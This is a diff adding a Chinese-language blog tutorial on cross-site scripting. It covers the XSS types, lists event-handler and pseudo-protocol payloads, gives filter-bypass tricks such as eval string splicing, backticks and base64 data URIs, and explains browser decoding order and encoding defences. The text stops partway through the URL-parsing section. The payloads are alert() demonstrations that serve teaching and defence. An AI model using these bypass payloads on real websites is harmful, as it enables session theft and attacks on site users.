@@ -1,0 +1,1099 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>XSS 相关</title>
+
+<link rel='canonical' href='https://coollllllll.github.io/p/xss/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='XSS 相关'>
+<meta property='og:description' content='go!'>
+<meta property='og:url' content='https://coollllllll.github.io/p/xss/'>
+<meta property='og:site_name' content='cOOl &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/xss/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+<meta name="twitter:title" content="XSS 相关">
+<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/xss/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/xss/">
+                <img src="/p/xss/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
+                        srcset="/p/xss/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/xss/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="534" 
+                        loading="lazy"
+                        alt="Featured image of post XSS 相关" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%B8%B8%E7%94%A8/" style="background-color: #2a9d8f; color: #fff;">
+                常用
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/xss/">XSS 相关</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        go!
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 09, 2020</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 18 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="xss漏洞">XSS漏洞</h1>
+<h2 id="定义和分类">定义和分类</h2>
+<p>XSS(跨站脚本攻击)，指攻击者构造恶意输入并插入网页，使得在客户端执行恶意代码，对用户造成危害。</p>
+<p>可分为三类：</p>
+<ul>
+<li>反射型</li>
+<li>存储型</li>
+<li>DOM型</li>
+</ul>
+<h2 id="危害">危害</h2>
+<ul>
+<li>盗取用户cookie</li>
+<li>键盘记录</li>
+<li>通过钓鱼盗取用户账户</li>
+<li>广告引流</li>
+<li>恶意软件或木马下载</li>
+<li>联动CSRF产生更大危害</li>
+</ul>
+<h2 id="反射型xss">反射型XSS</h2>
+<h3 id="原理">原理</h3>
+<p>应用程序对用户的输入未经过滤或其他处理，直接输出至HTML页面，则攻击者可以在漏洞发生的位置构造好恶意代码，发送链接至用户，用户点击后产生危害。</p>
+<h3 id="特点">特点</h3>
+<ul>
+<li>非持久化，只有本地用户受影响</li>
+<li>必须发送至其他用户并点击才会产生实际影响</li>
+</ul>
+<h2 id="存储型xss">存储型XSS</h2>
+<h3 id="原理-1">原理</h3>
+<p>用户提交的数据会被存储至后端，例如数据库，随后再通过读取数据库内容返回至前端页面。因此，攻击者可提交XSS代码用以存储，随后当读出数据并返回时会影响所有看到该页面的用户。</p>
+<h3 id="场景">场景</h3>
+<ul>
+<li>留言板、评论区</li>
+<li>用户头像、用户名字、个性签名</li>
+<li>系统通知</li>
+<li>..</li>
+</ul>
+<h2 id="dom型xss">DOM型XSS</h2>
+<h3 id="dom">DOM</h3>
+<p>一个HTML文档可以用一个DOM树简要表述，其描述了HTML文档中标签间的相互关联性。HTML文档被解析后即转化为DOM树，因此对HTML文档的处理可以通过对DOM树的操作实现，以改变文档的结构、样式或者内容。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 112; 
+			flex-basis: 270px"
+	>
+	<a href="/p/xss/image-20220120102421869.png" data-size="376x334">
+		<img src="/p/xss/image-20220120102421869.png"
+			width="376"
+			height="334"
+			srcset="/p/xss/image-20220120102421869_hu82e5a119b804c444ee031e0344774301_33386_480x0_resize_box_3.png 480w, /p/xss/image-20220120102421869_hu82e5a119b804c444ee031e0344774301_33386_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h3 id="原理-2">原理</h3>
+<p>本质上是一种特殊类型的反射型XSS，因为其数据并没有存储至服务端以持久化，而是通过JS操作DOM对象输出特定内容至页面。</p>
+<p>示例：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>DOM Based XSS Demo<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="kd">function</span> <span class="nx">xsstest</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">str</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;input&#34;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;output&#34;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;&lt;img src=&#39;&#34;</span><span class="o">+</span><span class="nx">str</span><span class="o">+</span><span class="s2">&#34;&#39;&gt;&lt;/img&gt;&#34;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;output&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;input&#34;</span> <span class="na">size</span><span class="o">=</span><span class="s">50</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;xsstest()&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div><p>上述场景：用户输入一个图片地址，点击提交后会自动将该地址拼接至img标签中并嵌入div标签。</p>
+<p>攻击者输入：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html">s&#39; onerror=&#39;javascript:alert(1)
+</code></pre></div><p>即会触发img标签的error事件，随后触发xss代码进行弹窗。</p>
+<h2 id="常用标签">常用标签</h2>
+<ul>
+<li>script</li>
+<li>img/video/audio：&lt;img src=&rsquo;s' onerror=&ldquo;alert(&lsquo;1&rsquo;);&quot;&gt;、&lt;video src=&rsquo;s' onerror=&ldquo;alert(&lsquo;1&rsquo;);&quot;&gt;</li>
+<li>input：&lt;input onfocus=&ldquo;alert(&lsquo;1&rsquo;);&rdquo; autofocus&gt;</li>
+<li>details：&lt;details open ontoggle=&ldquo;alert(&lsquo;1&rsquo;);&quot;&gt;</li>
+<li>svg：&lt;svg onload=alert(&ldquo;xss&rdquo;);&gt;</li>
+<li>select：&lt;select onfocus=&ldquo;alert(1);&rdquo; autofocus&gt;</li>
+<li>iframe：&lt;iframe onload=&ldquo;alert(&lsquo;1&rsquo;);&quot;&gt;&lt;/iframe&gt;、&lt;iframe src=&ldquo;javascript:alert(&lsquo;1&rsquo;)&quot;&gt;&lt;/iframe&gt;</li>
+<li>a：&lt;a href=&ldquo;javascript:alert(&lsquo;1&rsquo;)&quot;&gt;&lt;/a&gt;、&lt;a href=&rdquo;&rdquo; onmouseover=&ldquo;alert(&lsquo;1&rsquo;);&quot;&gt;aa&lt;/a&gt;</li>
+<li>form：&lt;form action=&ldquo;javascript:alert(&lsquo;xss&rsquo;)&rdquo; method=&ldquo;get&rdquo;&gt;</li>
+</ul>
+<blockquote>
+<p>在某些标签中嵌入脚本是无法执行的，例如：</p>
+<ul>
+<li>&lt;title&gt;</li>
+<li>&lt;textarea&gt;</li>
+<li>&lt;xmp&gt;</li>
+<li>&lt;iframe&gt;</li>
+<li>&lt;noscript&gt;</li>
+<li>&lt;noframes&gt;</li>
+<li>&lt;plaintext&gt;</li>
+</ul>
+<p>上述标签需要闭合后，再引入其他标签。</p>
+<p>注：&lt;script&gt; 和 &lt;style&gt;标签不支持嵌套</p>
+</blockquote>
+<h2 id="xss常见绕过">XSS常见绕过</h2>
+<h3 id="关键字过滤">关键字过滤</h3>
+<ul>
+<li>陌生标签代替</li>
+<li>大小写绕过</li>
+<li>双写绕过</li>
+<li>字符拼接</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;x&#34;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;a=`ale`;b=`rt`;c=&#39;(`1`);&#39;;eval(a+b+c)&#34;</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">top</span><span class="p">[</span><span class="s2">&#34;ale&#34;</span><span class="o">+</span><span class="s2">&#34;rt&#34;</span><span class="p">](</span><span class="s1">&#39;1&#39;</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div><ul>
+<li>编码绕过：详见后续</li>
+</ul>
+<h3 id="空格过滤">空格过滤</h3>
+<ul>
+<li><code>/</code>代替</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">img</span><span class="err">/</span><span class="na">src</span><span class="o">=</span><span class="s">&#34;x&#34;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;alert(&#39;1&#39;);&#34;</span><span class="p">&gt;</span>
+</code></pre></div><h3 id="单双引号过滤">单双引号过滤</h3>
+<ul>
+<li>反引号``代替</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">img</span><span class="err">/</span><span class="na">src</span><span class="o">=</span><span class="s">`x`</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(`1`);</span><span class="p">&gt;</span>
+</code></pre></div><ul>
+<li>编码绕过</li>
+</ul>
+<h3 id="括号过滤">括号过滤</h3>
+<ul>
+<li>反引号``代替</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="sb">`1`</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div><ul>
+<li>编码绕过</li>
+<li>throw语句绕过</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">;</span><span class="k">throw</span> <span class="s1">&#39;xss&#39;</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+
+# throw语句抛出异常(可以自定义)，alert接收异常并弹出
+</code></pre></div><h3 id="url过滤">url过滤</h3>
+<ul>
+<li>url编码绕过</li>
+<li>ip进制转换绕过</li>
+<li>使用//代替http://</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"># linux环境下才可以
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&#34;//www.baidu.com&#34;</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div><ul>
+<li>使用中文句号</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&#34;http://www。baidu。com&#34;</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div><h2 id="xss伪协议绕过">XSS伪协议绕过</h2>
+<p>data伪协议：</p>
+<pre tabindex="0"><code>data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 156; 
+			flex-basis: 376px"
+	>
+	<a href="/p/xss/image-20220120172221327.png" data-size="630x402">
+		<img src="/p/xss/image-20220120172221327.png"
+			width="630"
+			height="402"
+			srcset="/p/xss/image-20220120172221327_hu2461ef4061f3cabc396cb47053bee7bd_55406_480x0_resize_box_3.png 480w, /p/xss/image-20220120172221327_hu2461ef4061f3cabc396cb47053bee7bd_55406_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>javascript伪协议：</p>
+<pre tabindex="0"><code>javascript::alert('1')
+</code></pre><p>例子：</p>
+<pre tabindex="0"><code>&lt;a href=&quot;javascript:alert(2)&quot;&gt;a&lt;/a&gt;
+
+&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiWHNzVGVzdCIpOzwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;
+</code></pre><h2 id="xss编码绕过">XSS编码绕过</h2>
+<h3 id="unicode编码">Unicode编码</h3>
+<p>Unicode是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。其使用两个字节表示一个字符。</p>
+<p>Unicode只是一种容纳世界上所有文字和符号的字符编码方案，具体存储实现有UTF-8、UTF-16、UTF-32。</p>
+<p>JavaScript编码：</p>
+<pre tabindex="0"><code># 可以使用\uxxxx 来表示一个字符的Unicode编码，例如'haha'：
+\u0068\u0061\u0068\u0061
+</code></pre><p>HTML实体编码：</p>
+<pre tabindex="0"><code># &amp;开头+预先定义的实体名称+;分号结束,例如'&lt;':
+&amp;lt;
+
+# &amp;开头+#符号+字符在ASCII对应的十进制数字+;分号结束，例如'haha'：
+&amp;#104;&amp;#97;&amp;#104;&amp;#97;
+</code></pre><blockquote>
+<p>注：字符都是由实体编号的，但有些字符是没有实体名称的</p>
+</blockquote>
+<p>URL编码：</p>
+<pre tabindex="0"><code># 以'haha'为例：
+%68%61%68%61
+</code></pre><h3 id="浏览器解码规则">浏览器解码规则</h3>
+<p>编码方式有HTML实体编码、JS编码、URL编码，当浏览器解析HTML文档时又该以什什么样的方式和顺序对其进行解码呢？</p>
+<blockquote>
+<p>当浏览器接收到HTML文档时，通过HTML解析器将HTML文档解析为DOM树，这一过程中完成HTML实体解码；在DOM树创建过程中，如果遇到js或css相关的标签，则会触发JavaScript和CSS解释器完成内联脚本的解析，这一过程完成JS的解码；如果浏览器发现存在URL环境，则也会引入URL解析器完成对URL的解码工作，URL解码顺序会根据URL所在位置不同(可能在JJS解析器之前或之后)而有所区别。但HTML解析总是最先进行。</p>
+</blockquote>
+<h3 id="html解析过程">HTML解析过程</h3>
+<p>HTML有五类元素：</p>
+<ul>
+<li>空元素(Void elements)，如：area、base、br、col、command、embed、hr、img、input、keygen、link、meta、param、source、track、wbr等</li>
+<li>原始文本元素(Raw text elements)，如：&lt;script&gt;和&lt;style&gt;</li>
+<li>RCDATA元素(RCDATA elements)，如：&lt;textarea&gt;和&lt;title&gt;</li>
+<li>外部元素(Foreign elements)，如：MathML命名空间或者SVG命名空间的元素</li>
+<li>基本元素(Normal elements)，即除了以上4种元素以外的元素</li>
+</ul>
+<p>五类元素的区别：</p>
+<ul>
+<li>空元素：不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</li>
+<li>原始文本元素：可以容纳文本。</li>
+<li>RCDATA元素：可以容纳文本和字符引用。</li>
+<li>外部元素：可以容纳文本、字符引用、CDATA段、其他元素和注释</li>
+<li>基本元素：可以容纳文本、字符引用、其他元素和注释</li>
+</ul>
+<p>HTML解析器从文档输入流中消耗字符并根据转换规则转变至不同状态(以状态机的方式运行)：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 173; 
+			flex-basis: 416px"
+	>
+	<a href="/p/xss/image-20220121102112625.png" data-size="564x325">
+		<img src="/p/xss/image-20220121102112625.png"
+			width="564"
+			height="325"
+			srcset="/p/xss/image-20220121102112625_hu137e3ab169aed5bbd5bd590b0cdd9b46_54228_480x0_resize_box_3.png 480w, /p/xss/image-20220121102112625_hu137e3ab169aed5bbd5bd590b0cdd9b46_54228_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>引入示例：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+ <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+   hello,cool!
+ <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div><p>解析过程：</p>
+<ol>
+<li>初始状态为<strong>Data</strong> state，当消耗了<code>&lt;</code>字符，状态转为<strong>Tag open</strong> state，消耗一个a-z的字符产生一个开始标签符号，状态转为<strong>Tag name</strong> state，保持该状态直到消耗至<code>&gt;</code>字符，当中所消耗的每个字符都附加至这个符号名，例子中创建了<code>html</code>符号。</li>
+<li>当消耗到<code>z</code>，当前符号完成，此时状态转回<strong>Data</strong> state，<code>&lt;body&gt;</code>重复这一处理过程。此时，html和body标签已经识别出来，当前状态已回到<strong>Data</strong> state，消耗<code>hello,cool!</code>中的字符<code>h</code>并创建一个字符符号，这个过程会为<code>hello,cool!</code>中的每个字符都生成一个字符符号。</li>
+<li>直到遇到<code>&lt;/body&gt;</code>中的<code>&lt;</code>，进入<strong>Tag open</strong> state，消耗下一个字符<code>/</code>将创建一个闭合标签符号，状态转为<strong>Close tag open</strong> state，继续消耗字符，此时状态已转为<strong>Tag name</strong> state，保持该状态直到遇到<code>&gt;</code>。产生了一个新的标签符号并回到<strong>Data</strong> state。此后的闭合标签处理同上。</li>
+</ol>
+<blockquote>
+<p>注：</p>
+<p>HTML解析器处于数据状态（Data state）、RCDATA 状态（RCDATA state）、属性值状态（Attribute Value state）时，字符实体会被解码为对应的字符。</p>
+</blockquote>
+<p>示例：</p>
+<pre tabindex="0"><code>&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;
+
+&lt; 和 &gt; 被编码为字符实体&amp;#60; 和 &amp;#62;。
+当HTML解析器解析完&lt;div&gt;时，会进入数据状态（Data State）并发布标签令牌。接着解析到实体&amp;#60;时，因为处在数据状态Data State，所以就会对实体进行解码为&lt;，后面的&amp;#62;同样道理被解码为&gt;。
+</code></pre><p>在上述过程中当字符实体进行解码后只被视为字符引用，解析器在使用字符引用后不会转换到标签打开状态（<strong>Tag Open</strong> State），不进入标签打开状态就不会被发布为HTML标签。因此，<strong>img不会创建新HTML标签</strong>，只会将其作为数据来处理。<strong>这就是使用字符实体来避免用户不安全输入导致XSS的原因。</strong></p>
+<h4 id="特殊情况">特殊情况</h4>
+<ul>
+<li>原始文本元素</li>
+</ul>
+<p>HTML中Raw text elements的标签有两个：script、style。在原始文本类型标签下的所有内容块都属于该标签。</p>
+<p>Raw text elements类型标签下的所有字符实体编码都不会被HTML解码。HTML解析器解析到script、style标签的内容块（数据）部分时，状态会进入<strong>Script Data</strong> state，该状态并不在前面说的会解码字符实体的三个状态之中。</p>
+<p>因此，该例子：</p>
+<pre tabindex="0"><code>&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;
+</code></pre><p>中字符实体并不会被解码，也就不会执行JS。</p>
+<ul>
+<li>RCDATA</li>
+</ul>
+<p>HTML中 RCDATA 的标签有两个：textarea、title。解析器解析到 textarea、title 标签的数据部分时，状态会进入 <strong>RCDATA</strong> State。处于 <strong>RCDATA</strong> State 状态时，字符实体是会被解析器解码的。</p>
+<p>示例：</p>
+<pre tabindex="0"><code>&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;
+
+&lt;和&gt;被编码为实体&amp;#60;和&amp;#62;。
+里面的JS同样还是不会被执行，还是因为解码字符实体状态机不会进入标签打开状态(Tag Open State)，因此里面的&lt;script&gt;并不会被解析为HTML标签，也就不会被执行
+</code></pre><h3 id="javascript解析">JavaScript解析</h3>
+<p>形如<code> \uXXXX</code> 这样的 Unicode 字符转义序列或 Hex 编码是否能被解码需要看情况。</p>
+<p>JavaScript中有三个地方可以出现Unicode字符转义序列：</p>
+<ul>
+<li>字符串中</li>
+</ul>
+<p>Unicode转义序列出现在字符串中时，它只会被解释为普通字符，而不会破坏字符串的上下文。</p>
+<p>例如，<code>&lt;script&gt;alert(&quot;\u0031\u0030&quot;);&lt;/script&gt;</code>，被编码转义的部分为10，会被正常解码，JS代码也就会被执行。</p>
+<ul>
+<li>标识符中</li>
+</ul>
+<p>若Unicode转义序列存在于标识符中，即变量名、函数名等，它会被进行解码。</p>
+<p>例如，<code>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt;</code>，被编码转义的部分为alert字符，属于在标识符中的情况，因此会被正常解码，JS代码也会被执行。</p>
+<ul>
+<li>控制字符</li>
+</ul>
+<p>若Unicode转义序列存在于控制字符中，那么它会被解码但不会被解释为控制字符，而会被解释为标识符或字符串字符的一部分。控制字符即<code>'</code>、<code>&quot;</code>、<code>(</code>、<code>)</code>等。</p>
+<p>例如，<code>&lt;script&gt;alert\u0028&quot;xss&quot;); &lt;/script&gt;</code>，<code>(</code>进行了Unicode编码，那么解码后它不再是作为控制字符，而是作为标识符的一部分，即<code>alert(</code>。</p>
+<p>因此函数的括号之类的控制字符进行Unicode转义后是不能被正常解释的。</p>
+<p>示例：</p>
+<pre tabindex="0"><code>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;/script&gt;
+
+被编码部分为alert(11)。
+该例中的JS不会被执行，因为控制字符被编码了。
+</code></pre><p>示例：</p>
+<pre tabindex="0"><code>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;/script&gt;
+
+被编码部分为alert及括号内的12。
+该例中JS不会被执行，原因在于括号内被编码的部分不能被正常解释。要么使用ASCII码数字，要么加双引号或单引号使其变为字符串(就可以被解码)，作为字符串也只能作为普通字符。
+</code></pre><p>示例：</p>
+<pre tabindex="0"><code>&lt;script&gt;alert('13\u0027)&lt;/script&gt;
+
+被编码处为'。
+该例的JS不会执行，因为控制字符被编码了，解码后的'将变为字符串的一部分，而不再解释为控制字符。因此该例中字符串是不完整的，没有'来结束字符串。
+</code></pre><p>示例：</p>
+<pre tabindex="0"><code>&lt;script&gt;alert('14\u000a')&lt;/script&gt;
+
+该例的JS会被执行，因为被编码的部分处于字符串内，只会被解释为普通字符，不会突破字符串上下文。
+</code></pre><p>示例：</p>
+<pre tabindex="0"><code>&lt;img src = &quot;https://text.com&quot; onclick = 'alert(&quot;输入点&quot;)'&gt;
+
+开发人员单纯设置HTML实体编码为防御xss的手段，但是用户输入点在alert中
+如果用户正常输入的话凡是存在&lt; ,&quot; 等都能被转码，攻击者可以通过语句 &quot;);alert(&quot;test，在服务端被编码：
+&lt;img src = &quot;https://gss1.bdstatic.com&quot; onclick = 'alert(&quot;FIRST XSS&amp;#34;&amp;#41;&amp;#59;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#116;&amp;#101;&amp;#115;&amp;#116;&quot;)'&gt; 
+解码后弹窗两次，是因为浏览器进行HTML解码发现存在两个alert()
+
+对于这种情况，正确防御XSS的方法：应该是先JavaScript编码然后再进行HTML编码
+用户输入 &quot;);alert(&quot;test 后在服务端先JavaScript编码然后再进行HTML编码，在
+在浏览器端：首先经过第一步HTML解码后变为\u0022\u0029\u003B\u0061\u006C\u0065\u0072\u0074\u0028\u0022\u0074\u0065\u0073\u0074，JavaScript解析器工作，变为 &quot;);alert(&quot;test ，而JavaScript解析时只有标识符名称不会被当做字符串，控制字符仅会被解析为标示符名称或者字符串，因此\u0022被解释成双引号文本，\u0028和\u0029被解释成为圆括号文本，不会变为控制字符被解析执行。在这里采用的先JS编码后HTML编码中只弹窗了一次。
+</code></pre><h3 id="url解析">URL解析</h3>
+<p>URL解析器也被建模为状态机，文档输入流中的字符可以将其导向不同的状态。</p>
+<blockquote>
+<p>URL的Scheme部分（协议部分）必须为ASCII字符，即不能被任何编码，否则URL解析器的状态机将进入No Scheme状态。</p>
+</blockquote>
+<p>示例：</p>
+<pre tabindex="0"><code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;
+
+URL编码部分的是javascript:alert(1)。
+
+JS不会被执行，因为作为Scheme部分的&quot;javascript&quot;这个字符串被编码，导致URL解析器状态机进入No Scheme状态。
+</code></pre><blockquote>
+<p>URL中的<code>:</code>也不能被以任何方式编码，否则URL解析器的状态机也将进入No Scheme状态。</p>
+</blockquote>
+<p>示例：</p>
+<pre tabindex="0"><code>&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;
+
+由于:被URL编码为%3a，导致URL状态机进入No Scheme状态，JS代码不能执行。
+</code></pre><p>示例：</p>
+<pre tabindex="0"><code>&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;
+
+&quot;javascript&quot;这个字符串被实体化编码，:没有被编码，alert(2)被URL编码。
+
+成功执行。首先，HTML状态机处于属性值状态(Attribute Value State)时，字符实体时会被解码的，此处在href属性中，所以被实体化编码的&quot;javascript&quot;字符串会被解码。
+
